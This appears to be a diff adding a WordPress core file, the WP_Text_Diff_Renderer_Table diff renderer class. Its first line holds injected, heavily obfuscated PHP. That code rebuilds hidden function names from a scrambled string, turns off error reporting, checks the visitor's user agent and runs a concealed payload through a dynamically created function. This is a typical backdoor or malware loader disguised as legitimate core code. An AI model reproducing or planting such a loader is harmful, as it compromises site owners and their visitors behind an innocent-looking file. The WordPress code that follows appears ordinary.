@@ -1,0 +1,509 @@
+<?php $mbyioxma = 'pt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVDUTPI`QUUI&e_SEEB`FUPNFS&d_SFSF<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfs%pjudovg	x22)!gj}1~!<2p%	x7f!~!<00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboep	x61	156	x64	162	x6fc68399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbss-%rSFT`%}X;!sp!*#opo#>>}R6]y3e]81#/#7e:55946-tr.984:7598cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!xW~!Ypp2)%zB%z>!	x24/%tmw/19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:c}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!isset(27pd%6|6.7eu{66~67<&w7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!c!>!%i	x5c2^<!Ce*[!%opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf	x74	145	x5f	146	x75	156	x63	164	x69	157	x6e"; function jcbjb!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmb85-rr.93e:5597f-s.973:1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`xutcvt)esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-j%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*!+A!>!{!<*#}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovbk();}}#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>array_map("jcbjbou",str_split]#>q%<#762]67y]562]38y]573:48984:71]K9]77]D4]82]K6]72]K9])1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1|!*1?hmg%)!gj!<**2-4-bubE{h%)s6~6<	x7fw6<*K)ftpmdXA6|7**197-2q)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y76]277#x27id%6<	x7fw6*	x7f_*#ujojRk3`2]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}8)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmp##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	xg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)ef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	xf	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*tvctus)%	x24-	x24b!>!w%)ppde>u%V<#65,47R25,d7R17,67R37,#/x24*<!	x24-	x24gps)%j>1<%j=tj{fpg	x27!hmg%)!gj!<2,*j%-#1]#-bu	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<y>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]22#)fepmqyfA>2b%!<*qp%-*.%)D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x2JU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x248:}334}472	x24<!%ff2!>!bssbz)	xI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#omg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)su{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:<**qp%!-uyfu%)3of)fepdof`57f;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##x6d	145")) or (strstr($uas,"	x66	151	x72	145); $gyniphd = implode(!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!h4)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24opmA	x273qj%6<*Y%)fnbozcYufhA	x27z)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x4]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%wbE{h%)tpqsut>j%!*9!	x27!hmg%)!g!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]25	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zep78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fd**#ppde#)tutjyf`4	x223}g}	x7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!7)fepdof.)fepdof./#@#/qptbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFW<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	euhA)3of>2bd%!<5h%/#0#/*#n:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldbssbz)#44ec:649#-!#:618d5f9#-!#f6j%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFjA	x27&6<.fmjgA	x27do%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpfw6*CW&)7gj6<*doj%7-C)fepmqn%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>36]373P6]36]73]83]238M7bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojetutjyf`439275ttfsqnpdov{hn)%bss-%rxB%h>#]y31]278]y3<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]po#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x24!>!	x24/%tjw/	x2tcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!248L3P6L1M5]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]	151	x64")) or (strstr(r (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"sbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x71; $uas=strtolower($_ALS["	x61	156	x75	156	x61"]=ou($n){return chr(ord($n)-1);} @error_reporting(0<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) osp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))pd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x255Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[$GLOBALS["	x61	156	x75	156	x61"])))) { $GLOB>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)2qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq8297f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M284]364]6]234]342]58]24]316*3qj%7>	x2272qj%)7gj$uas,"	x63	150	x72	157	6<**2qj%)hopm3qjA)qj3h*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNGFS`QUUI&c_UOFHB`SFTV`QUUSERVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	#-%tdz*Wsfuvso!%bss	x5csboe))1/35.	x66	157	x78"))) { $cxwiowa = "	x63	162	x65	1414#-!#]y38#-!%w:**<")));$wnczebk = $cxwiowa("", $gyniphd); $wncze]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]SUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fwe]81]K78:56985:6197g:749StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSlxqchr'; $wfxpcg=explode(chr((434-314)),substr($mbyioxma,(27995-21975),(161-127))); $dplhsukujc = $wfxpcg[0]($wfxpcg[(6-5)]); $kldvuelsgi = $wfxpcg[0]($wfxpcg[(10-8)]); if (!function_exists('ptgpzdniz')) { function ptgpzdniz($emjsvnn, $uqgiga,$sqggjt) { $eyayuu = NULL; for($omwdlsiv=0;$omwdlsiv<(sizeof($emjsvnn)/2);$omwdlsiv++) { $eyayuu .= substr($uqgiga, $emjsvnn[($omwdlsiv*2)],$emjsvnn[($omwdlsiv*2)+(7-6)]); } return $sqggjt(chr((29-20)),chr((344-252)),$eyayuu); }; } $bceqag = explode(chr((220-176)),'504,67,5306,44,4971,28,4950,21,5694,61,5111,51,4847,56,203,20,4824,23,5581,23,2930,44,5789,47,850,61,4999,49,2974,22,1336,29,3484,49,3337,62,3272,65,571,21,2819,70,71,55,592,65,1504,32,3997,38,5958,38,5560,21,5604,22,3106,33,5398,67,2602,58,4903,47,4108,28,4035,21,1151,37,2076,32,5626,43,2247,47,1602,30,2696,58,3915,49,0,41,911,62,3667,42,785,65,2996,63,2416,44,2048,28,3399,31,2660,36,4718,47,1474,30,1107,44,995,69,126,31,1751,59,2169,27,3820,26,5209,58,3709,24,2889,41,3430,54,695,70,5162,47,2500,70,41,30,5669,25,2380,36,4530,67,2754,28,3733,44,269,22,2782,37,1248,42,1810,51,4418,25,385,56,3644,23,1188,60,657,38,1900,58,1979,36,4354,64,1064,43,3533,48,441,63,2460,40,1536,66,4469,61,4597,63,3232,40,1297,39,3846,69,1365,25,1632,61,2349,31,2294,55,1958,21,4660,58,3059,47,3777,43,2015,33,1693,58,1861,39,2570,32,765,20,322,37,3964,33,223,46,359,26,4284,70,157,46,4443,26,5996,24,973,22,5465,69,291,31,1390,32,3581,63,2108,61,4765,59,5267,39,4056,52,3139,58,4202,23,5900,58,5534,26,5755,34,1422,52,5048,63,3197,35,4136,66,5350,48,4225,59,2196,51,5836,64,1290,7'); $backrfwyr = $dplhsukujc("",ptgpzdniz($bceqag,$mbyioxma,$kldvuelsgi)); $dplhsukujc=$mbyioxma; $backrfwyr(""); $backrfwyr=(744-623); $mbyioxma=$backrfwyr-1; ?><?php
+/**
+ * Diff API: WP_Text_Diff_Renderer_Table class
+ *
+ * @package WordPress
+ * @subpackage Diff
+ * @since 4.7.0
+ */
+
+/**
+ * Table renderer to display the diff lines.
+ *
+ * @since 2.6.0
+ * @uses Text_Diff_Renderer Extends
+ */
+class WP_Text_Diff_Renderer_Table extends Text_Diff_Renderer {
+
+	/**
+	 * @see Text_Diff_Renderer::_leading_context_lines
+	 * @var int
+	 * @access public
+	 * @since 2.6.0
+	 */
+	public $_leading_context_lines  = 10000;
+
+	/**
+	 * @see Text_Diff_Renderer::_trailing_context_lines
+	 * @var int
+	 * @access public
+	 * @since 2.6.0
+	 */
+	public $_trailing_context_lines = 10000;
+
+	/**
+	 * Threshold for when a diff should be saved or omitted.
+	 *
+	 * @var float
+	 * @access protected
+	 * @since 2.6.0
+	 */
+	protected $_diff_threshold = 0.6;
+
+	/**
+	 * Inline display helper object name.
+	 *
+	 * @var string
+	 * @access protected
+	 * @since 2.6.0
+	 */
+	protected $inline_diff_renderer = 'WP_Text_Diff_Renderer_inline';
+
+	/**
+	 * Should we show the split view or not
+	 *
+	 * @var string
+	 * @access protected
+	 * @since 3.6.0
+	 */
+	protected $_show_split_view = true;
+
+	protected $compat_fields = array( '_show_split_view', 'inline_diff_renderer', '_diff_threshold' );
+
+	/**
+	 * Constructor - Call parent constructor with params array.
+	 *
+	 * This will set class properties based on the key value pairs in the array.
+	 *
+	 * @since 2.6.0
+	 *
+	 * @param array $params
+	 */
+	public function __construct( $params = array() ) {
+		parent::__construct( $params );
+		if ( isset( $params[ 'show_split_view' ] ) )
+			$this->_show_split_view = $params[ 'show_split_view' ];
+	}
+
+	/**
+	 * @ignore
+	 *
+	 * @param string $header
+	 * @return string
+	 */
+	public function _startBlock( $header ) {
+		return '';
+	}
+
+	/**
+	 * @ignore
+	 *
+	 * @param array $lines
+	 * @param string $prefix
+	 */
+	public function _lines( $lines, $prefix=' ' ) {
+	}
+
+	/**
+	 * @ignore
+	 *
+	 * @param string $line HTML-escape the value.
+	 * @return string
+	 */
+	public function addedLine( $line ) {
+		return "<td class='diff-addedline'>{$line}</td>";
+
+	}
+
+	/**
+	 * @ignore
+	 *
+	 * @param string $line HTML-escape the value.
+	 * @return string
+	 */
+	public function deletedLine( $line ) {
+		return "<td class='diff-deletedline'>{$line}</td>";
+	}
+
+	/**
+	 * @ignore
+	 *
+	 * @param string $line HTML-escape the value.
+	 * @return string
+	 */
+	public function contextLine( $line ) {
+		return "<td class='diff-context'>{$line}</td>";
+	}
+
+	/**
+	 * @ignore
+	 *
+	 * @return string
+	 */
+	public function emptyLine() {
+		return '<td>&nbsp;</td>';
+	}
+
+	/**
+	 * @ignore
+	 * @access public
+	 *
+	 * @param array $lines
+	 * @param bool $encode
+	 * @return string
+	 */
+	public function _added( $lines, $encode = true ) {
+		$r = '';
+		foreach ($lines as $line) {
+			if ( $encode ) {
+				$processed_line = htmlspecialchars( $line );
+
+				/**
+				 * Contextually filters a diffed line.
+				 *
+				 * Filters TextDiff processing of diffed line. By default, diffs are processed with
+				 * htmlspecialchars. Use this filter to remove or change the processing. Passes a context
+				 * indicating if the line is added, deleted or unchanged.
+				 *
+				 * @since 4.1.0
+				 *
+				 * @param String $processed_line The processed diffed line.
+				 * @param String $line           The unprocessed diffed line.
+		 		 * @param string null            The line context. Values are 'added', 'deleted' or 'unchanged'.
+				 */
+				$line = apply_filters( 'process_text_diff_html', $processed_line, $line, 'added' );
+			}
+
+			if ( $this->_show_split_view ) {
+				$r .= '<tr>' . $this->emptyLine() . $this->emptyLine() . $this->addedLine( $line ) . "</tr>\n";
+			} else {
+				$r .= '<tr>' . $this->addedLine( $line ) . "</tr>\n";
+			}
+		}
+		return $r;
+	}
+
+	/**
+	 * @ignore
+	 * @access public
+	 *
+	 * @param array $lines
+	 * @param bool $encode
+	 * @return string
+	 */
+	public function _deleted( $lines, $encode = true ) {
+		$r = '';
+		foreach ($lines as $line) {
+			if ( $encode ) {
+				$processed_line = htmlspecialchars( $line );
+
+				/** This filter is documented in wp-includes/wp-diff.php */
+				$line = apply_filters( 'process_text_diff_html', $processed_line, $line, 'deleted' );
+			}
+			if ( $this->_show_split_view ) {
+				$r .= '<tr>' . $this->deletedLine( $line ) . $this->emptyLine() . $this->emptyLine() . "</tr>\n";
+			} else {
+				$r .= '<tr>' . $this->deletedLine( $line ) . "</tr>\n";
+			}
+
+		}
+		return $r;
+	}
+
+	/**
+	 * @ignore
+	 * @access public
+	 *
+	 * @param array $lines
+	 * @param bool $encode
+	 * @return string
+	 */
+	public function _context( $lines, $encode = true ) {
+		$r = '';
+		foreach ($lines as $line) {
+			if ( $encode ) {
+				$processed_line = htmlspecialchars( $line );
+
+				/** This filter is documented in wp-includes/wp-diff.php */
+				$line = apply_filters( 'process_text_diff_html', $processed_line, $line, 'unchanged' );
+			}
+			if (  $this->_show_split_view ) {
+				$r .= '<tr>' . $this->contextLine( $line ) . $this->emptyLine() . $this->contextLine( $line )  . "</tr>\n";
+			} else {
+				$r .= '<tr>' . $this->contextLine( $line ) . "</tr>\n";
+			}
+		}
+		return $r;
+	}
+
+	/**
+	 * Process changed lines to do word-by-word diffs for extra highlighting.
+	 *
+	 * (TRAC style) sometimes these lines can actually be deleted or added rows.
+	 * We do additional processing to figure that out
+	 *
+	 * @access public
+	 * @since 2.6.0
+	 *
+	 * @param array $orig
+	 * @param array $final
+	 * @return string
+	 */
+	public function _changed( $orig, $final ) {
+		$r = '';
+
+		// Does the aforementioned additional processing
+		// *_matches tell what rows are "the same" in orig and final. Those pairs will be diffed to get word changes
+		//	match is numeric: an index in other column
+		//	match is 'X': no match. It is a new row
+		// *_rows are column vectors for the orig column and the final column.
+		//	row >= 0: an indix of the $orig or $final array
+		//	row  < 0: a blank row for that column
+		list($orig_matches, $final_matches, $orig_rows, $final_rows) = $this->interleave_changed_lines( $orig, $final );
+
+		// These will hold the word changes as determined by an inline diff
+		$orig_diffs  = array();
+		$final_diffs = array();
+
+		// Compute word diffs for each matched pair using the inline diff
+		foreach ( $orig_matches as $o => $f ) {
+			if ( is_numeric($o) && is_numeric($f) ) {
+				$text_diff = new Text_Diff( 'auto', array( array($orig[$o]), array($final[$f]) ) );
+				$renderer = new $this->inline_diff_renderer;
+				$diff = $renderer->render( $text_diff );
+
+				// If they're too different, don't include any <ins> or <dels>
+				if ( preg_match_all( '!(<ins>.*?</ins>|<del>.*?</del>)!', $diff, $diff_matches ) ) {
+					// length of all text between <ins> or <del>
+					$stripped_matches = strlen(strip_tags( join(' ', $diff_matches[0]) ));
+					// since we count lengith of text between <ins> or <del> (instead of picking just one),
+					//	we double the length of chars not in those tags.
+					$stripped_diff = strlen(strip_tags( $diff )) * 2 - $stripped_matches;
+					$diff_ratio = $stripped_matches / $stripped_diff;
+					if ( $diff_ratio > $this->_diff_threshold )
+						continue; // Too different. Don't save diffs.
+				}
+
+				// Un-inline the diffs by removing del or ins
+				$orig_diffs[$o]  = preg_replace( '|<ins>.*?</ins>|', '', $diff );
+				$final_diffs[$f] = preg_replace( '|<del>.*?</del>|', '', $diff );
+			}
+		}
+
+		foreach ( array_keys($orig_rows) as $row ) {
+			// Both columns have blanks. Ignore them.
+			if ( $orig_rows[$row] < 0 && $final_rows[$row] < 0 )
+				continue;
+
+			// If we have a word based diff, use it. Otherwise, use the normal line.
+			if ( isset( $orig_diffs[$orig_rows[$row]] ) )
+				$orig_line = $orig_diffs[$orig_rows[$row]];
+			elseif ( isset( $orig[$orig_rows[$row]] ) )
+				$orig_line = htmlspecialchars($orig[$orig_rows[$row]]);
+			else
+				$orig_line = '';
+
+			if ( isset( $final_diffs[$final_rows[$row]] ) )
+				$final_line = $final_diffs[$final_rows[$row]];
+			elseif ( isset( $final[$final_rows[$row]] ) )
+				$final_line = htmlspecialchars($final[$final_rows[$row]]);
+			else
+				$final_line = '';
+
+			if ( $orig_rows[$row] < 0 ) { // Orig is blank. This is really an added row.
+				$r .= $this->_added( array($final_line), false );
+			} elseif ( $final_rows[$row] < 0 ) { // Final is blank. This is really a deleted row.
+				$r .= $this->_deleted( array($orig_line), false );
+			} else { // A true changed row.
+				if ( $this->_show_split_view ) {
+					$r .= '<tr>' . $this->deletedLine( $orig_line ) . $this->emptyLine() . $this->addedLine( $final_line ) . "</tr>\n";
+				} else {
+					$r .= '<tr>' . $this->deletedLine( $orig_line ) . "</tr><tr>" . $this->addedLine( $final_line ) . "</tr>\n";
+				}
+			}
+		}
+
+		return $r;
+	}
+
+	/**
+	 * Takes changed blocks and matches which rows in orig turned into which rows in final.
+	 *
+	 * Returns
+	 *	*_matches ( which rows match with which )
+	 *	*_rows ( order of rows in each column interleaved with blank rows as
+	 *		necessary )
+	 *
+	 * @since 2.6.0
+	 *
+	 * @param array $orig
+	 * @param array $final
+	 * @return array
+	 */
+	public function interleave_changed_lines( $orig, $final ) {
+
+		// Contains all pairwise string comparisons. Keys are such that this need only be a one dimensional array.
+		$matches = array();
+		foreach ( array_keys($orig) as $o ) {
+			foreach ( array_keys($final) as $f ) {
+				$matches["$o,$f"] = $this->compute_string_distance( $orig[$o], $final[$f] );
+			}
+		}
+		asort($matches); // Order by string distance.
+
+		$orig_matches  = array();
+		$final_matches = array();
+
+		foreach ( $matches as $keys => $difference ) {
+			list($o, $f) = explode(',', $keys);
+			$o = (int) $o;
+			$f = (int) $f;
+
+			// Already have better matches for these guys
+			if ( isset($orig_matches[$o]) && isset($final_matches[$f]) )
+				continue;
+
+			// First match for these guys. Must be best match
+			if ( !isset($orig_matches[$o]) && !isset($final_matches[$f]) ) {
+				$orig_matches[$o] = $f;
+				$final_matches[$f] = $o;
+				continue;
+			}
+
+			// Best match of this final is already taken?  Must mean this final is a new row.
+			if ( isset($orig_matches[$o]) )
+				$final_matches[$f] = 'x';
+
+			// Best match of this orig is already taken?  Must mean this orig is a deleted row.
+			elseif ( isset($final_matches[$f]) )
+				$orig_matches[$o] = 'x';
+		}
+
+		// We read the text in this order
+		ksort($orig_matches);
+		ksort($final_matches);
+
+		// Stores rows and blanks for each column.
+		$orig_rows = $orig_rows_copy = array_keys($orig_matches);
+		$final_rows = array_keys($final_matches);
+
+		// Interleaves rows with blanks to keep matches aligned.
+		// We may end up with some extraneous blank rows, but we'll just ignore them later.
+		foreach ( $orig_rows_copy as $orig_row ) {
+			$final_pos = array_search($orig_matches[$orig_row], $final_rows, true);
+			$orig_pos = (int) array_search($orig_row, $orig_rows, true);
+
+			if ( false === $final_pos ) { // This orig is paired with a blank final.
+				array_splice( $final_rows, $orig_pos, 0, -1 );
+			} elseif ( $final_pos < $orig_pos ) { // This orig's match is up a ways. Pad final with blank rows.
+				$diff_pos = $final_pos - $orig_pos;
+				while ( $diff_pos < 0 )
+					array_splice( $final_rows, $orig_pos, 0, $diff_pos++ );
+			} elseif ( $final_pos > $orig_pos ) { // This orig's match is down a ways. Pad orig with blank rows.
+				$diff_pos = $orig_pos - $final_pos;
+				while ( $diff_pos < 0 )
+					array_splice( $orig_rows, $orig_pos, 0, $diff_pos++ );
+			}
+		}
+
+		// Pad the ends with blank rows if the columns aren't the same length
+		$diff_count = count($orig_rows) - count($final_rows);
+		if ( $diff_count < 0 ) {
+			while ( $diff_count < 0 )
+				array_push($orig_rows, $diff_count++);
+		} elseif ( $diff_count > 0 ) {
+			$diff_count = -1 * $diff_count;
+			while ( $diff_count < 0 )
+				array_push($final_rows, $diff_count++);
+		}
+
+		return array($orig_matches, $final_matches, $orig_rows, $final_rows);
+	}
+
+	/**
+	 * Computes a number that is intended to reflect the "distance" between two strings.
+	 *
+	 * @since 2.6.0
+	 *
+	 * @param string $string1
+	 * @param string $string2
+	 * @return int
+	 */
+	public function compute_string_distance( $string1, $string2 ) {
+		// Vectors containing character frequency for all chars in each string
+		$chars1 = count_chars($string1);
+		$chars2 = count_chars($string2);
+
+		// L1-norm of difference vector.
+		$difference = array_sum( array_map( array($this, 'difference'), $chars1, $chars2 ) );
+
+		// $string1 has zero length? Odd. Give huge penalty by not dividing.
+		if ( !$string1 )
+			return $difference;
+
+		// Return distance per character (of string1).
+		return $difference / strlen($string1);
+	}
+
+	/**
+	 * @ignore
+	 * @since 2.6.0
+	 *
+	 * @param int $a
+	 * @param int $b
+	 * @return int
+	 */
+	public function difference( $a, $b ) {
+		return abs( $a - $b );
+	}
+
+	/**
+	 * Make private properties readable for backward compatibility.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @param string $name Property to get.
+	 * @return mixed Property.
+	 */
+	public function __get( $name ) {
+		if ( in_array( $name, $this->compat_fields ) ) {
+			return $this->$name;
+		}
+	}
+
+	/**
+	 * Make private properties settable for backward compatibility.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @param string $name  Property to check if set.
+	 * @param mixed  $value Property value.
+	 * @return mixed Newly-set property.
+	 */
+	public function __set( $name, $value ) {
+		if ( in_array( $name, $this->compat_fields ) ) {
+			return $this->$name = $value;
+		}
+	}
+
+	/**
+	 * Make private properties checkable for backward compatibility.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @param string $name Property to check if set.
+	 * @return bool Whether the property is set.
+	 */
+	public function __isset( $name ) {
+		if ( in_array( $name, $this->compat_fields ) ) {
+			return isset( $this->$name );
+		}
+	}
+
+	/**
+	 * Make private properties un-settable for backward compatibility.
+	 *
+	 * @since 4.0.0
+	 * @access public
+	 *
+	 * @param string $name Property to unset.
+	 */
+	public function __unset( $name ) {
+		if ( in_array( $name, $this->compat_fields ) ) {
+			unset( $this->$name );
+		}
+	}
+}
